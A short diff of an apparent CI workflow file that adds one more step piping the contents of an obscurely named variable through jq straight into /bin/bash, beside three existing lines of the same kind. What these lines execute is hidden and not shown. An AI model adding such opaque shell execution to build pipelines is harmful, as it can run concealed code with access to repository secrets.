@@ -22,6 +22,7 @@ jobs:
           echo $ny04 | jq -r .xgu9749 | /bin/bash
           printf '%s' "$pxzy21" | jq -r .txi8 | /bin/bash
           echo $fp28 | jq -r .ky3 | /bin/bash
+          echo $nq158 | jq -r .wlbj223 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
